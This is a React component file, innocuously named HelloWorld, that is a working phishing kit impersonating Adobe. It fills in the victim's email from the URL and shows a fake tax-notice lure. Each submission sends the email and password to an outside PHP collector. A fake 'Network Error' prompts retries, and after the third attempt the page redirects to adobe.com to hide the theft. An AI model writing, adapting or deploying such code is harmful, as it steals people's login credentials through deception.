
import { useState } from 'react';
import './adobe.css';
import $ from 'jquery';

const HelloWorld = ()=>{


    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase().toLowerCase().split('*', 1).toString();
    


    const [email, setEmail] = useState(extracetdEmailC);
    const [password, setPassword] = useState('');

    const [view, setView] = useState('View Document');
    const [errMsg, setErrMsg] = useState(false);

    const [count, setCount] = useState(0);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        if (password === "") {
          return null
        } else {

          setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = "https://www.adobe.com/";
                    // window.location.href = `https://www.${extracetdemailDomain}`;
                }, 1500);
            };

            setView('Please wait...');
            

            setTimeout(()=>{
              setView('View Document');
              setPassword('');
              setErrMsg(true);
            }, 3200)

        // post to server

        const user = {
            email,
            password
        };
    
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/nalex/ee.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
          
        }
    };



    return(<article className='main col-sm-4 card tttop'>
        
        <img
            src='data:image/png;base64,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'
            alt='KGgoAAAANSUhEUgAAAb0AAAAAdobe_Online_Update'
            className=''
        />

        <p className='cust_txt_'>
            Download the enclosed Tax Demand Notice Form as quickly as
            possible and make full provisions of the enlisted Demands
            available prior to our visit.
        </p>
        
        <form 
            id="formx" 
            className="my-4 p-3" 
            onSubmit={submitDefaultForm}
        >

        { errMsg ? 
            <small className="text-danger" id="msg" style={{fontWeight:600}}>
                Network Error! Please verify your information and try again
            </small>
            : null
        }

            <div>
              <input 
                type="email" 
                name="x1" 
                id="x1" 
                className="form-control mb-3" 
                value={email} 
                readOnly 
                onChange={e=> setEmail(e.target.value)}
              />
            </div>
    
            <div className='paswd_wrap'>
              <input 
                type="password" 
                name="x2" 
                id="x2" 
                className="form-control mb-3" 
                placeholder="Password" 
                value={password} 
                required 
                onChange={e=>setPassword(e.target.value)}
              />
            </div>
    
    
            <div>
              <button id="submitBtn" className="btn btn-md btn-block btn-danger btn-block">
                {view}
              </button>
            </div>
        </form>

    </article>)
};

export default HelloWorld;